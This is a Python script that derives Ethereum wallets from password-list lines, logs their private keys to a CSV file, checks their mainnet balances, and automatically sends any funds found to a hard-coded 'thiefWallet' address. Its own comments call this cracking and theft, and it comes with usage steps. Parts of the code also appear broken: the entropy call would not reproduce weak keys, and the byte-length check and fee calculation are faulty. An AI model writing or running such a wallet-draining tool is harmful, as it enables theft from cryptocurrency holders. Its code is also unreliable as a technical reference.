#!/usr/bin/env python3

#############################################
#
# This script does the following:
#	Pulls entropy from a given file (Rockyou.txt or a similar password list works)
#	Creates an Ethereum wallet from this entropy
#	Saves the public and private keys of this wallet into a CSV file for future use
# 	Checks the balance
# 	If we find a wallet with Ether in it, the keys are weak so let's take the balance
#
# Benefits:
# 	Dynamic fee generation (with changeable margin of safety) to ensure your transaction goes through
#
# How to use it:
#	Install 'pip' and any packages this program needs, as listed in the import statements below
#	Update the variables highlighted below
#	Run with 'python ethkeygen.py'
#	???
#	Profit
#
# Project TODOs:
#	Prompt user to change variable settings upon first running of the program
#	Verbosity setting
# 	Better error handling for web3 calls
#	Check for any ERC tokens, not just Ether specifically
#	Add more wordlists to source file
#	Allow for other-language wordlists
#	Pull in any source files in a directory
#	Generate mnemonic phrases for secondary fuzzing - https://github.com/de-centralized-systems/python-bip39/
#
#############################################

import sys, csv, eth_utils
from web3 import Web3
from eth_account.account import Account
from sys import getsizeof # TODO: why can't we just 'import sys'?

__author__ = "Mark Rudnitsky"
__copyright__ = "(C)2022 Mark Rudnitsky"
__credits__ = ["Mark Rudnitsky"]
__license__ = "GPLv3"
__version__ = "1.0"
__maintainer__ = "Mark Rudnitsky"
__status__ = "Prototype"

### CHANGE THESE ASAP ###
keygenFile = "rockyou.txt" # For entropy
dictFileName = "generated-keypairs.csv" # Database for generated keypairs
thiefWallet = "0x2e2b43E20FCFC44D4cfCB16A723270c7a0Bc914F" # Transfer any found funds here
# Transaction fee details
maxGasPerTx = 0 # Max gas we're willing to pay to make our transaction go through; 0 = set the gas price dyamically based on market conditions
marginOfSafety = 20 # Percent above fee market rate we wnt to be at, high is more guarantee your tx will be included in the next block
gasCost = 21000 # Keep constant unless you know what you're doing
preferredPriorityFee = 4 # Current values: https://ethgasstation.info, https://etherscan.io/gastracker
# API Details
infuraKey = "UPDATE_TO_YOUR_OWN_API_KEY" # ETH mainnet API access through Infura
connectionUrl = "https://mainnet.infura.io/v3/" + infuraKey # Infura HTTPS API
#connectionUrl = "wss://mainnet.infura.io/ws/v3/" + infuraKey # Infura Websockets API
### END CHANGE THESE ASAP ###

# Connect to the APIs so we can interact with the Ethereum blockchian
if (connectionUrl.startswith('wss')): # Websockets
	web3 = Web3(Web3.WebsocketProvider(connectionUrl))
else: # HTTP(S)
	web3 = Web3(Web3.HTTPProvider(connectionUrl))

# Double check our connection works
if not web3.isConnected():
	sys.exit("[ERROR] Cannot connect to given URL. Please verify you input the correct URL with no typos.")

# Use the 'entropy' parameter to create an account
def generateAddress(entropy):
	tempAcct = Account.create(extra_entropy=entropy)
	pubKey = tempAcct.address # Public key/address
	privKey = tempAcct.key # Private key
	#privKey = encode_hex(tempAcct.key) # Usually won't work with Metamask &c but is human readable
	return pubKey, privKey

# Roll reporting into one function
def reporting(pubKey, privKey, balance):
	#header = ['Ether Wallet Public Key', 'Ether Wallet Private Key', 'ETH Balance']
	data = [pubKey, privKey, balance]
	with open(dictFileName, 'a+', encoding='UTF8', newline='') as dictionaryFile:
		writer = csv.writer(dictionaryFile)
		writer.writerow(data)

# The actual cracking and theft
def findANonZeroBalance(entropy):
	#print(str(entropy))
	# Create a wallet
	pubKey, privKey = generateAddress(entropy)

	nonce = web3.eth.getTransactionCount(pubKey, 'latest')
	balance = web3.eth.getBalance(pubKey) # Balance in wei
	#print(web3.fromWei(balance, "ether"))
	
	# Save relevant data
	reporting(pubKey, privKey, balance)

	# Jackpot
	if (balance > 0): # 1 in 2^256 chance this condition is true		
		# Calculate gas costs (london fork and EIP-1559 compliant)
		baseFee = int(maxGasPerTx)
		if not baseFee:
			baseFee = web3.eth.getBlock("pending").baseFeePerGas
		priorityFee = web3.toWei(preferredPriorityFee, 'gwei')
		marginOfSafety = 1 + (marginOfSafety / 100)
		maxFee = web3.toWei((((2 * baseFee) + priorityFee) * marginOfSafety), 'gwei')
		
		# Generate a send-to-us transaction
		tx = {
			'from': pubKey,
			'nonce': nonce,
			'to': thiefWallet,
			'value': balance,
			'gas': gasCost,
			'maxFeePerGas': maxFee,
			'maxPriorityFeePerGas': priorityFee
		}

		signed_tx = web3.eth.account.signTransaction(tx, privKey)
		tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction)
		#print(web3.toHex(tx_hash))	

# Main function
def main():
	print("[INFO] Generating keys, this will take a while ...")
	# Open up our source of entropy
	sourceFile = open(keygenFile)

	for lineNum, textLine in enumerate(sourceFile):
		# Get the line from the file and format it for our Ethereum tools
		tempLine = str(textLine).strip()
		tempLine = bytes(tempLine, 'utf-8')

		# Generate address permutations
		tempLineByteLength = getsizeof(tempLine)
		
		# Do basic entropy permutations
		# Only allowed keylengths are defined in BIP39 
		for maxByteLength in [128, 160, 192, 224, 256]:
			# Too long, just use the first or last maxByteLength bytes
			# TODO: Potentially do every maxByteLength-length permutation of tempLine?
			if (tempLineByteLength > maxByteLength):
				# First maxByteLength bytes
				findANonZeroBalance(tempLine[:maxByteLength])

				# Last maxByteLength bytes
				findANonZeroBalance(tempLine[len(tempLine) - maxByteLength:])

			# Edge case - line doesn't exist or isnt working
			elif (tempLineByteLength < 0):
				findANonZeroBalance('')

			# Proper length entropy
			else:
				# TODO: Do every permutation of padding (1L-255R, 2L-254R, 3L-253R, etc)
				pad = maxByteLength - tempLineByteLength

				# Pad on the left
				findANonZeroBalance(bytes(pad) + tempLine)
			
				# Pad on the right
				findANonZeroBalance(tempLine + bytes(pad))

				# Pad 50/50 Left/Right split
				findANonZeroBalance(bytes(int(pad / 2)) + tempLine + bytes(int(pad / 2)) + bytes(int(pad % 2)))
				
	print("[INFO] Keygen complete, please check \'" + dictFileName + "\' in this directory for details.")
	sourceFile.close()

# Main function
if __name__=="__main__":
    main()
